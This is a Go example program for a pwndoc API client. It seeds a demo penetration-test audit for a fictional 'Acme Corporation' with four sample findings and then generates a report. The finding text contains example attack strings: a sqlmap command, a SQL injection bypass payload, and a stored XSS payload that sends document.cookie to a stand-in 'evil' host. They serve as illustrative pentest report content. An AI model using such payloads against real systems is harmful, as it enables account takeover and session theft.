// Command demoseed creates a realistic, PERSISTENT demo pentest on a pwndoc
// instance — a company, a client, an audit with full general info, and several
// findings covering every field (description, observation, references, a
// captioned proof-of-concept screenshot, affected assets, full CVSS 3.1 vectors,
// remediation difficulty/priority and remediation steps) with bold/italic/
// underline/highlight/code/list formatting. Unlike the integration test, it does
// NOT clean up, so you can open the audit in the pwndoc UI afterwards.
//
// Connection details come from the environment (no secrets in source):
//
//	PWNDOC_URL=https://your-instance:8443
//	PWNDOC_USER=youruser
//	PWNDOC_PASS=yourpass
//	PWNDOC_INSECURE=1   # self-signed certificate
//
//	go run ./examples/demoseed
package main

import (
	"bytes"
	"context"
	"image"
	"image/color"
	"image/png"
	"log"
	"os"
	"time"

	pwndoc "github.com/RaynLight/go-pwndocapi/pwndoc"
)

func main() {
	base := os.Getenv("PWNDOC_URL")
	if base == "" {
		log.Fatal("set PWNDOC_URL (and PWNDOC_USER / PWNDOC_PASS)")
	}
	var opts []pwndoc.Option
	if os.Getenv("PWNDOC_INSECURE") == "1" {
		opts = append(opts, pwndoc.WithInsecureTLS())
	}
	ctx, cancel := context.WithTimeout(context.Background(), 180*time.Second)
	defer cancel()

	c, err := pwndoc.Connect(ctx, base, os.Getenv("PWNDOC_USER"), os.Getenv("PWNDOC_PASS"), opts...)
	if err != nil {
		log.Fatalf("connect: %v", err)
	}

	// Working report template (created if missing).
	tmpl, err := c.Templates.EnsureDefault(ctx, "go-pwndocapi-default")
	if err != nil {
		log.Fatalf("template: %v", err)
	}

	langs, err := c.Data.Languages(ctx)
	if err != nil || len(langs) == 0 {
		log.Fatalf("languages: %v", err)
	}
	types, err := c.Data.AuditTypes(ctx)
	if err != nil || len(types) == 0 {
		log.Fatalf("audit types: %v", err)
	}

	// The engagement: company, client, scope, dates, template — all by name.
	audit, err := c.NewPentest("Acme Q2 2026 External Pentest", langs[0].Locale, types[0].Name).
		Company("Acme Corporation").
		Client("ciso@acme.example", "Dana", "Lee").
		TemplateByName(tmpl.Name).
		Scope("app.acme.example", "api.acme.example", "vpn.acme.example", "203.0.113.0/24").
		Dates("2026-06-01", "2026-06-12").
		Run(ctx)
	if err != nil {
		log.Fatalf("create engagement: %v", err)
	}
	log.Printf("created audit %s (%q)", audit.ID, audit.Name)

	shot := screenshotPNG(0x1e, 0x90, 0xff) // a visible blue banner image

	findings := []struct {
		f      pwndoc.Finding
		groups []pwndoc.FindingImageGroup
	}{
		{
			f: pwndoc.Finding{
				Title:    "SQL Injection in login form",
				VulnType: "Web Application",
				Category: "Web",
				Description: pwndoc.NewRichText().
					Text("The login form concatenates the username parameter directly into a SQL statement.").
					P("Impact: "+pwndoc.Bold("unauthenticated")+" access to "+
						pwndoc.Highlight("the entire user database")+" ("+pwndoc.Underline("read and write")+").").
					Bullets("Confirmed on POST /api/login", "Confirmed on GET /api/search?q=").
					Code("bash", "sqlmap -u 'https://app.acme.example/api/login' --data 'user=*&pass=x' --batch --dbs").
					String(),
				Observation: pwndoc.Para("Both error-based and time-based blind payloads succeed; the DB user has " + pwndoc.Bold("DBA") + " privileges."),
				Remediation: pwndoc.NewRichText().
					H(5, "Remediation steps").
					Numbered(
						"Replace string concatenation with parameterized queries / prepared statements.",
						"Apply strict allow-list validation on the "+pwndoc.Code("username")+" field.",
						"Run the application DB account with least privilege (no DBA).",
						"Add a WAF rule as defense in depth.",
					).String(),
				References:            []string{"https://owasp.org/Top10/A03_2021-Injection/", "https://cwe.mitre.org/data/definitions/89.html"},
				Scope:                 pwndoc.Bullets(pwndoc.Esc("app.acme.example (203.0.113.10)"), pwndoc.Esc("api.acme.example (203.0.113.11)")),
				CVSSv3:                cvss(pwndoc.ScopeChanged, pwndoc.ImpactHigh, pwndoc.ImpactHigh, pwndoc.ImpactHigh),
				Priority:              pwndoc.PriorityUrgent,
				RemediationComplexity: pwndoc.RemediationComplex,
				Status:                pwndoc.Ptr(pwndoc.FindingRedacting),
			},
			groups: []pwndoc.FindingImageGroup{{
				Text: pwndoc.Para("Proof of concept — payload " + pwndoc.Code("' OR 1=1 -- -") + " returns the admin session:"),
				Images: []pwndoc.ImageSpec{
					{Bytes: shot, Mime: "image/png", Name: "sqli.png", Caption: "Figure 1 - authentication bypass via SQLi"},
				},
			}},
		},
		{
			f: pwndoc.Finding{
				Title:    "Stored Cross-Site Scripting in comments",
				VulnType: "Web Application",
				Category: "Web",
				Description: pwndoc.NewRichText().
					Text("User comments are stored and rendered without output encoding.").
					P("A payload such as " + pwndoc.Code("<script>fetch('//evil/'+document.cookie)</script>") +
						" executes for every viewer.").String(),
				Observation:           pwndoc.Para("Session cookies are not marked " + pwndoc.Bold("HttpOnly") + ", so the payload can exfiltrate them."),
				Remediation:           pwndoc.NewRichText().Numbered("Context-aware output encoding on render.", "Set HttpOnly and SameSite on session cookies.", "Add a strict Content-Security-Policy.").String(),
				References:            []string{"https://owasp.org/Top10/A03_2021-Injection/", "https://cwe.mitre.org/data/definitions/79.html"},
				Scope:                 pwndoc.Bullets(pwndoc.Esc("app.acme.example/comments")),
				CVSSv3:                cvss(pwndoc.ScopeChanged, pwndoc.ImpactLow, pwndoc.ImpactLow, pwndoc.ImpactNone),
				Priority:              pwndoc.PriorityHigh,
				RemediationComplexity: pwndoc.RemediationMedium,
				Status:                pwndoc.Ptr(pwndoc.FindingRedacting),
			},
			groups: []pwndoc.FindingImageGroup{{
				Text: pwndoc.Para("Stored payload firing on page load:"),
				Images: []pwndoc.ImageSpec{
					{Bytes: screenshotPNG(0xe0, 0x6c, 0x75), Mime: "image/png", Name: "xss.png", Caption: "Figure 1 - alert() proving script execution"},
				},
			}},
		},
		{
			f: pwndoc.Finding{
				Title:    "Missing HTTP security headers",
				VulnType: "Configuration",
				Category: "Web",
				Description: pwndoc.NewRichText().
					Text("Responses omit several recommended security headers.").
					Bullets("No "+pwndoc.Code("Content-Security-Policy"), "No "+pwndoc.Code("Strict-Transport-Security"), "No "+pwndoc.Code("X-Content-Type-Options")).
					String(),
				Observation:           pwndoc.Para("Lowers defense in depth against XSS, clickjacking and protocol-downgrade attacks."),
				Remediation:           pwndoc.NewRichText().Numbered("Add CSP, HSTS, X-Content-Type-Options: nosniff and X-Frame-Options.", "Validate with securityheaders.com.").String(),
				References:            []string{"https://owasp.org/www-project-secure-headers/"},
				Scope:                 pwndoc.Bullets(pwndoc.Esc("app.acme.example"), pwndoc.Esc("api.acme.example")),
				CVSSv3:                cvss(pwndoc.ScopeUnchanged, pwndoc.ImpactNone, pwndoc.ImpactLow, pwndoc.ImpactNone),
				Priority:              pwndoc.PriorityMedium,
				RemediationComplexity: pwndoc.RemediationEasy,
				Status:                pwndoc.Ptr(pwndoc.FindingRedacting),
			},
		},
		{
			f: pwndoc.Finding{
				Title:                 "Verbose TLS / weak cipher suites",
				VulnType:              "Network",
				Category:              "Infrastructure",
				Description:           pwndoc.NewRichText().Text("The VPN endpoint negotiates TLS 1.0 and CBC cipher suites.").P("Modern clients should require " + pwndoc.Bold("TLS 1.2+") + " with AEAD ciphers.").String(),
				Observation:           pwndoc.Para("No evidence of exploitation, but non-compliant with current baselines."),
				Remediation:           pwndoc.NewRichText().Numbered("Disable TLS 1.0/1.1 and CBC ciphers.", "Prefer TLS 1.3.").String(),
				References:            []string{"https://www.rfc-editor.org/rfc/rfc8996"},
				Scope:                 pwndoc.Bullets(pwndoc.Esc("vpn.acme.example:443 (203.0.113.20)")),
				CVSSv3:                cvss(pwndoc.ScopeUnchanged, pwndoc.ImpactLow, pwndoc.ImpactNone, pwndoc.ImpactNone),
				Priority:              pwndoc.PriorityLow,
				RemediationComplexity: pwndoc.RemediationEasy,
				Status:                pwndoc.Ptr(pwndoc.FindingDone),
			},
		},
	}

	for i, item := range findings {
		var created *pwndoc.Finding
		if len(item.groups) > 0 {
			created, err = c.AddFindingWithImages(ctx, audit.ID, item.f, item.groups...)
		} else {
			created, err = c.Findings.Create(ctx, audit.ID, item.f)
		}
		if err != nil {
			log.Fatalf("finding %d (%q): %v", i+1, item.f.Title, err)
		}
		log.Printf("  + finding %d: %q (IDX-%03d, CVSS %s)", i+1, created.Title, created.Identifier, created.CVSSv3)
	}

	n, err := c.GenerateReport(ctx, audit.ID, "out/acme-demo-report.docx")
	if err != nil {
		log.Fatalf("generate report: %v", err)
	}
	log.Printf("generated report: out/acme-demo-report.docx (%d bytes)", n)
	log.Printf("DONE — open audit %s in the pwndoc UI to review the engagement.", audit.ID)
}

// cvss builds a full CVSS 3.1 vector (network, low complexity, no privileges, no
// UI) with the given scope and CIA impacts, plus temporal+environmental metrics.
func cvss(s pwndoc.CVSSScope, conf, integ, avail pwndoc.Impact) string {
	return pwndoc.CVSS31{
		AV: pwndoc.AVNetwork, AC: pwndoc.ACLow, PR: pwndoc.PRNone, UI: pwndoc.UINone,
		S: s, C: conf, I: integ, A: avail,
		E: pwndoc.EFunctional, RL: pwndoc.RLOfficialFix, RC: pwndoc.RCConfirmed,
		CR: pwndoc.ReqHigh, IR: pwndoc.ReqMedium, AR: pwndoc.ReqLow,
	}.Vector()
}

// screenshotPNG returns a small solid-color PNG so the embedded proof images are
// actually visible in the report and the UI.
func screenshotPNG(r, g, b uint8) []byte {
	img := image.NewRGBA(image.Rect(0, 0, 480, 140))
	fill := color.RGBA{r, g, b, 0xff}
	for y := 0; y < 140; y++ {
		for x := 0; x < 480; x++ {
			img.Set(x, y, fill)
		}
	}
	var buf bytes.Buffer
	_ = png.Encode(&buf, img)
	return buf.Bytes()
}
